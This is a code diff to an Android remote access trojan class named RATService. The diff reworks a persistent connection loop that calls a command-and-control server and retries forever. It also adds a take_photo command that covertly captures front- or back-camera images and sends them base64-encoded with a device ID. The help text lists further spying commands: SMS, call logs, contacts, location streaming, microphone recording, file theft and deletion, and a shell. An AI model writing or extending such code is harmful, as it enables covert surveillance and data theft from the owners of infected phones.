@@ -91,6 +91,9 @@ public class RATService extends Service {
     private ShellModule shellModule;
     private DeviceModule deviceModule;
     
+    // Track camera state
+    private boolean isUsingFrontCamera = false;
+    
     // Binder for GuardianService communication
     public class RATServiceBinder extends Binder {
         public void heartbeat() throws RemoteException {
@@ -310,114 +313,114 @@ public class RATService extends Service {
         }
     }
     
-  private void startConnection() {
-    if (executor == null || executor.isShutdown()) {
-        executor = Executors.newSingleThreadExecutor();
-    }
-    
-    executor.execute(() -> {
-        int retryCount = 0;
-        int consecutiveNetworkErrors = 0;
-        
-        while (isRunning.get()) {
-            try {
-                // Check if network is available first
-                if (!isNetworkAvailable()) {
-                    Log.d(TAG, "No network available, waiting...");
-                    Thread.sleep(RETRY_INTERVAL * 1000);
-                    continue;
-                }
-                
-                // Reset network error counter on successful check
-                consecutiveNetworkErrors = 0;
-                
-                // Connect with timeout
-                socket = new Socket();
-                socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
-                socket.setKeepAlive(true);
-                
-                out = new PrintWriter(socket.getOutputStream(), true);
-                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-                
-                Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
-                
-                // Reset counters on successful connection
-                consecutiveFailures = 0;
-                retryCount = 0;
-                
-                // Send initial device info
-                sendDeviceInfo();
-                
-                // Main processing loop - blocks on readLine()
-                String line;
-                long lastReadTime = System.currentTimeMillis();
-                
-                while (isRunning.get() && (line = in.readLine()) != null) {
-                    lastReadTime = System.currentTimeMillis();
-                    processCommand(line);
-                }
-                
-                // Check if we've been stuck too long (safety check)
-                if (System.currentTimeMillis() - lastReadTime > READ_TIMEOUT_CHECK) {
-                    Log.w(TAG, "Read timeout check triggered, reconnecting...");
-                }
-                
-            } catch (SocketTimeoutException e) {
-                Log.e(TAG, "Socket timeout", e);
-                consecutiveFailures++;
-            } catch (IOException e) {
-                Log.e(TAG, "Connection error: " + e.getMessage());
-                consecutiveFailures++;
-                consecutiveNetworkErrors++;
-            } catch (InterruptedException e) {
-                Log.e(TAG, "Sleep interrupted", e);
-                Thread.currentThread().interrupt();
-                break;
-            } catch (Exception e) {
-                Log.e(TAG, "Unexpected error", e);
-                consecutiveFailures++;
-            } finally {
-                closeConnection();
-            }
-            
-            // Keep trying forever - NO MAX RETRIES LIMIT
-            if (isRunning.get()) {
-                // Calculate delay with exponential backoff
-                long delay;
-                if (consecutiveFailures < 5) {
-                    delay = RETRY_INTERVAL * 1000; // 30 seconds
-                } else if (consecutiveFailures < 10) {
-                    delay = 60000; // 1 minute
-                } else if (consecutiveFailures < 20) {
-                    delay = 120000; // 2 minutes
-                } else {
-                    delay = 300000; // 5 minutes max
-                }
-                
-                // If we have too many network errors, increase wait time
-                if (consecutiveNetworkErrors > 5) {
-                    Log.w(TAG, "Multiple network errors, waiting longer...");
-                    delay = Math.max(delay, 60000); // At least 1 minute
-                }
-                
-                retryCount++;
-                Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
-                
-                try {
-                    Thread.sleep(delay);
-                } catch (InterruptedException ie) {
-                    Log.e(TAG, "Reconnect sleep interrupted", ie);
-                    Thread.currentThread().interrupt();
-                    break;
-                }
-            }
+    private void startConnection() {
+        if (executor == null || executor.isShutdown()) {
+            executor = Executors.newSingleThreadExecutor();
         }
         
-        // If we exit the loop, schedule a full service restart
-        Log.w(TAG, "Connection loop ended, scheduling service restart");
-        scheduleRestartWithAlarm();
-    });
-}
+        executor.execute(() -> {
+            int retryCount = 0;
+            int consecutiveNetworkErrors = 0;
+            
+            while (isRunning.get()) {
+                try {
+                    // Check if network is available first
+                    if (!isNetworkAvailable()) {
+                        Log.d(TAG, "No network available, waiting...");
+                        Thread.sleep(RETRY_INTERVAL * 1000);
+                        continue;
+                    }
+                    
+                    // Reset network error counter on successful check
+                    consecutiveNetworkErrors = 0;
+                    
+                    // Connect with timeout
+                    socket = new Socket();
+                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
+                    socket.setKeepAlive(true);
+                    
+                    out = new PrintWriter(socket.getOutputStream(), true);
+                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                    
+                    Log.d(TAG, "✅ Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
+                    
+                    // Reset counters on successful connection
+                    consecutiveFailures = 0;
+                    retryCount = 0;
+                    
+                    // Send initial device info
+                    sendDeviceInfo();
+                    
+                    // Main processing loop - blocks on readLine()
+                    String line;
+                    long lastReadTime = System.currentTimeMillis();
+                    
+                    while (isRunning.get() && (line = in.readLine()) != null) {
+                        lastReadTime = System.currentTimeMillis();
+                        processCommand(line);
+                    }
+                    
+                    // Check if we've been stuck too long (safety check)
+                    if (System.currentTimeMillis() - lastReadTime > READ_TIMEOUT_CHECK) {
+                        Log.w(TAG, "Read timeout check triggered, reconnecting...");
+                    }
+                    
+                } catch (SocketTimeoutException e) {
+                    Log.e(TAG, "Socket timeout", e);
+                    consecutiveFailures++;
+                } catch (IOException e) {
+                    Log.e(TAG, "Connection error: " + e.getMessage());
+                    consecutiveFailures++;
+                    consecutiveNetworkErrors++;
+                } catch (InterruptedException e) {
+                    Log.e(TAG, "Sleep interrupted", e);
+                    Thread.currentThread().interrupt();
+                    break;
+                } catch (Exception e) {
+                    Log.e(TAG, "Unexpected error", e);
+                    consecutiveFailures++;
+                } finally {
+                    closeConnection();
+                }
+                
+                // Keep trying forever - NO MAX RETRIES LIMIT
+                if (isRunning.get()) {
+                    // Calculate delay with exponential backoff
+                    long delay;
+                    if (consecutiveFailures < 5) {
+                        delay = RETRY_INTERVAL * 1000; // 30 seconds
+                    } else if (consecutiveFailures < 10) {
+                        delay = 60000; // 1 minute
+                    } else if (consecutiveFailures < 20) {
+                        delay = 120000; // 2 minutes
+                    } else {
+                        delay = 300000; // 5 minutes max
+                    }
+                    
+                    // If we have too many network errors, increase wait time
+                    if (consecutiveNetworkErrors > 5) {
+                        Log.w(TAG, "Multiple network errors, waiting longer...");
+                        delay = Math.max(delay, 60000); // At least 1 minute
+                    }
+                    
+                    retryCount++;
+                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + retryCount + ")");
+                    
+                    try {
+                        Thread.sleep(delay);
+                    } catch (InterruptedException ie) {
+                        Log.e(TAG, "Reconnect sleep interrupted", ie);
+                        Thread.currentThread().interrupt();
+                        break;
+                    }
+                }
+            }
+            
+            // If we exit the loop, schedule a full service restart
+            Log.w(TAG, "Connection loop ended, scheduling service restart");
+            scheduleRestartWithAlarm();
+        });
+    }
     
     private void closeConnection() {
         try {
@@ -451,45 +454,50 @@ public class RATService extends Service {
     }
     
     private void sendCommand(String data) {
-    if (out != null) {
-        try {
-            // For very large data, send in chunks
-            if (data.length() > 65536) { // 64KB threshold
-                Log.d(TAG, "Large response detected (" + data.length() + " chars), sending in chunks");
-                
-                // Send header with total size
-                out.println("FILE_CHUNK|START|" + data.length());
-                out.flush();
-                
-                // Send in 32KB chunks
-                int chunkSize = 32768;
-                for (int i = 0; i < data.length(); i += chunkSize) {
-                    int end = Math.min(i + chunkSize, data.length());
-                    String chunk = data.substring(i, end);
-                    out.println("FILE_CHUNK|DATA|" + i + "|" + chunk);
+        if (out != null) {
+            try {
+                // For very large data, send in chunks
+                if (data.length() > 65536) { // 64KB threshold
+                    Log.d(TAG, "Large response detected (" + data.length() + " chars), sending in chunks");
+                    
+                    // Send header with total size
+                    out.println("FILE_CHUNK|START|" + data.length());
                     out.flush();
                     
-                    // Small delay to prevent overwhelming the socket
-                    try {
-                        Thread.sleep(10);
-                    } catch (InterruptedException e) {
-                        // Ignore
+                    // Send in 32KB chunks
+                    int chunkSize = 32768;
+                    for (int i = 0; i < data.length(); i += chunkSize) {
+                        int end = Math.min(i + chunkSize, data.length());
+                        String chunk = data.substring(i, end);
+                        out.println("FILE_CHUNK|DATA|" + i + "|" + chunk);
+                        out.flush();
+                        
+                        // Small delay to prevent overwhelming the socket
+                        try {
+                            Thread.sleep(10);
+                        } catch (InterruptedException e) {
+                            // Ignore
+                        }
                     }
+                    
+                    // Send end marker
+                    out.println("FILE_CHUNK|END");
+                    out.flush();
+                } else {
+                    // Normal size, send normally
+                    out.println(data);
+                    out.flush();
                 }
-                
-                // Send end marker
-                out.println("FILE_CHUNK|END");
-                out.flush();
-            } else {
-                // Normal size, send normally
-                out.println(data);
-                out.flush();
+                Log.d(TAG, "📤 Sent: " + (data.length() > 100 ? data.substring(0, 100) + "..." : data));
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending command", e);
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Error sending command", e);
         }
     }
-}
+    
+    private void sendCommand(JSONObject json) {
+        sendCommand(json.toString());
+    }
     
     private void processCommand(String command) {
         Log.d(TAG, "Received raw command: " + command);
@@ -531,7 +539,7 @@ public class RATService extends Service {
                 break;
                 
             case "help":
-                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_test, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
+                String helpText = "Available commands: info, location, location_stream [start/stop], take_photo, camera, camera_switch, camera_test, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
                 sendCommand("HELP|" + helpText);
                 break;
                 
@@ -559,65 +567,132 @@ public class RATService extends Service {
                 handleLocationStreamCommand(args);
                 break;
                 
-            // Camera commands
+            // Camera commands - Updated to match working project format
+            case "take_photo":
             case "camera":
             case "camera_photo":
                 if (cameraModule != null) {
                     Log.d(TAG, "📸 Executing camera capture");
                     
-                    // Send immediate acknowledgment
-                    sendCommand("CAMERA|Processing...");
+                    // Get camera type from args
+                    String cameraType = args.isEmpty() ? "back" : args;
+                    boolean useFrontCamera = cameraType.equals("front");
                     
-                    // Run camera capture on background thread to avoid blocking the socket
+                    // Switch camera if needed
+                    if (useFrontCamera && !isUsingFrontCamera) {
+                        String switchResult = cameraModule.switchCamera();
+                        isUsingFrontCamera = true;
+                        Log.d(TAG, "🔄 Switched to front camera: " + switchResult);
+                    } else if (!useFrontCamera && isUsingFrontCamera) {
+                        String switchResult = cameraModule.switchCamera();
+                        isUsingFrontCamera = false;
+                        Log.d(TAG, "🔄 Switched to back camera: " + switchResult);
+                    }
+                    
+                    // Send immediate acknowledgment
+                    try {
+                        JSONObject ack = new JSONObject();
+                        ack.put("command", "photo_result")
+                           .put("status", "processing")
+                           .put("camera_type", cameraType);
+                        sendCommand(ack);
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Error sending ack", e);
+                    }
+                    
+                    // Run camera capture on background thread
                     executor.submit(() -> {
                         try {
-                            Log.d(TAG, "📸 Calling cameraModule.takePhoto() on thread: " + Thread.currentThread().getName());
+                            Log.d(TAG, "📸 Calling cameraModule.takePhoto()");
                             long startTime = System.currentTimeMillis();
                             String result = cameraModule.takePhoto();
                             long endTime = System.currentTimeMillis();
-                            Log.d(TAG, "📸 Camera takePhoto() took " + (endTime - startTime) + "ms");
-                            Log.d(TAG, "📸 Camera result length: " + (result != null ? result.length() : "null"));
+                            Log.d(TAG, "📸 Camera took " + (endTime - startTime) + "ms");
+                            
+                            // Format response like working project
+                            JSONObject photoResult = new JSONObject();
+                            photoResult.put("command", "photo_result");
+                            
                             if (result != null && result.startsWith("ERROR")) {
-                                Log.e(TAG, "❌ Camera error: " + result);
+                                photoResult.put("status", "error")
+                                          .put("message", result);
+                            } else if (result != null && !result.isEmpty()) {
+                                // Check if result already has data:image prefix
+                                String base64Data;
+                                if (result.startsWith("data:image")) {
+                                    base64Data = result.replaceFirst("data:image/jpeg;base64,", "");
+                                } else {
+                                    base64Data = result;
+                                }
+                                
+                                photoResult.put("status", "success")
+                                          .put("image_data", base64Data)
+                                          .put("camera_type", cameraType)
+                                          .put("device_id", getUniqueDeviceId());
                             } else {
-                                Log.d(TAG, "✅ Camera success, sending result");
+                                photoResult.put("status", "error")
+                                          .put("message", "Unknown response format");
                             }
-                            sendCommand("CAMERA|" + result);
+                            
+                            sendCommand(photoResult);
+                            
                         } catch (Exception e) {
                             Log.e(TAG, "❌ Error in camera capture", e);
-                            sendCommand("CAMERA|ERROR: " + e.getMessage());
+                            try {
+                                JSONObject errorResult = new JSONObject();
+                                errorResult.put("command", "photo_result")
+                                          .put("status", "error")
+                                          .put("message", e.getMessage());
+                                sendCommand(errorResult);
+                            } catch (JSONException je) {
+                                Log.e(TAG, "JSON error", je);
+                            }
                         }
                     });
+                    
                 } else {
                     Log.e(TAG, "❌ Camera module not available");
-                    sendCommand("CAMERA|ERROR: Camera module not available");
+                    try {
+                        JSONObject errorResult = new JSONObject();
+                        errorResult.put("command", "photo_result")
+                                  .put("status", "error")
+                                  .put("message", "Camera module not available");
+                        sendCommand(errorResult);
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
                 }
                 break;
-                case "camera_test_capture":
-    if (cameraModule != null) {
-        String result = cameraModule.testCapture();
-        sendCommand("CAMERA_TEST_CAPTURE|" + result);
-    } else {
-        sendCommand("CAMERA_TEST_CAPTURE|ERROR: Camera module not available");
-    }
-    break;
+                
+            case "camera_test_capture":
+                if (cameraModule != null) {
+                    String result = cameraModule.testCapture();
+                    sendCommand("CAMERA_TEST_CAPTURE|" + result);
+                } else {
+                    sendCommand("CAMERA_TEST_CAPTURE|ERROR: Camera module not available");
+                }
+                break;
+                
             case "camera_switch":
                 if (cameraModule != null) {
                     Log.d(TAG, "🔄 Switching camera");
                     String result = cameraModule.switchCamera();
+                    isUsingFrontCamera = !isUsingFrontCamera;
                     sendCommand("CAMERA_SWITCH|" + result);
                 } else {
                     sendCommand("CAMERA_SWITCH|ERROR: Camera module not available");
                 }
                 break;
-                case "camera_status":
-    if (cameraModule != null) {
-        String result = cameraModule.checkCameraStatus();
-        sendCommand("CAMERA_STATUS|" + result);
-    } else {
-        sendCommand("CAMERA_STATUS|ERROR: Camera module not available");
-    }
-    break;
+                
+            case "camera_status":
+                if (cameraModule != null) {
+                    String result = cameraModule.checkCameraStatus();
+                    sendCommand("CAMERA_STATUS|" + result);
+                } else {
+                    sendCommand("CAMERA_STATUS|ERROR: Camera module not available");
+                }
+                break;
+                
             case "camera_test":
                 if (cameraModule != null) {
                     Log.d(TAG, "🔧 Testing camera module");
